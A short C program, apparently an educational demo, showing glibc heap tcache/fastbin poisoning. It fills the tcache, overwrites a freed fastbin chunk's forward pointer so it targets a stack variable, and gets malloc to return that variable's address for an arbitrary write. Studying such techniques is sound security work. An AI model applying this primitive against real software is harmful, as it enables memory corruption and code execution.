#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

int main(void){
	unsigned long *m, *victim;
	malloc_chunk *c;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	m = malloc(0x18);	// M
	c = mem2chunk(m);
	for(int i=0; i<7; i++)
		free(calloc(1, 0x18));

	free(m);		// to fastbin
	puts("Exploit!");
	c->fd = ((void*)&var)-0x10;	// vuln

	malloc(0x18); 		// from tcache (counts--)
	calloc(1, 0x18);	// from fastbin (fastbin -> tcache)

	victim = malloc(0x18);	// alloc var from tcache
	*victim = 0xcafebabe;	// overwrite

	printf("victim = %p\nvar    = %#lx\n", victim, var);
}
